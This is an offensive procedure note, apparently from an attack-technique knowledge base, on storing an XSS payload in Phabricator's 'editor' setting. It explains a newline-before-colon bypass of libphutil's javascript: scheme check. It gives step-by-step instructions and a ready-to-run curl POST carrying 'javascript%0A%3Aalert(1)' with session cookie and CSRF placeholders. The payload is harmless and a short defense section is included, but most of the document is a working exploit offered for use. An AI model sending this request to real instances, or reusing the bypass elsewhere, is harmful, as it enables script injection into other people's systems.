---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567893
tags:
  - xss-injection
  - curl
  - phabricator
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-phabricator-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:31.196Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Editor-Parameter-via-Curl

## Summary

This procedure modifies a captured Phabricator settings POST request and executes it via curl to inject a javascript: URI with a newline bypass into the 'editor' parameter, storing a persistent XSS payload.

## Description

The phutil_tag function in libphutil/src/markup/render.php checks for 'javascript:' but ignores whitespace like newlines before the colon, which Chrome interprets as executable. Browser forms strip these, so curl is used to send 'javascript%0A:alert(1)'. This affects the user's editor link, leading to self-XSS. Target: Authenticated Phabricator instance; outcomes: Payload stored, verifiable in settings.

## Requirements

1. Captured curl command from previous step
2. Valid session cookies or CSRF token
3. curl installed on local machine

## Defense

Defensive measures and detection strategies:

- Normalize URI schemes by trimming whitespace in validation
- Audit libphutil for similar bypasses and apply patches
- Monitor for anomalous editor URL patterns in logs

## Objectives

1. Bypass scheme validation with encoded newline
2. Persist the XSS payload in user settings
3. Confirm injection without browser interference

## Instructions

### Step 1: Modify Captured Request

**Context**: Edit the curl command to replace the editor parameter with the payload.

No command; manually adjust the --data-raw section.

> Change 'editor=oldvalue' to 'editor=javascript%0A%3Aalert(1)', ensuring URL-encoding (%0A for newline, %3A for colon).

### Step 2: Execute Injection

**Context**: Send the modified request to save the malicious setting.

**Command** ([[commands/inject-phabricator-xss-payload]]):
```bash
curl 'https://phabricator.example.com/settings/panel/display/' -X POST --data-raw 'editor=javascript%0A%3Aalert(1)&__csrf__=token' -H 'Cookie: phabricator.sid=abc123;'
```

> This submits the payload; expect HTTP 200 and a redirect or success message.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-phabricator-xss-payload]]

## Tools Used

- [[tools/curl]]

## Tags

- [[xss-injection]]
- [[phabricator]]
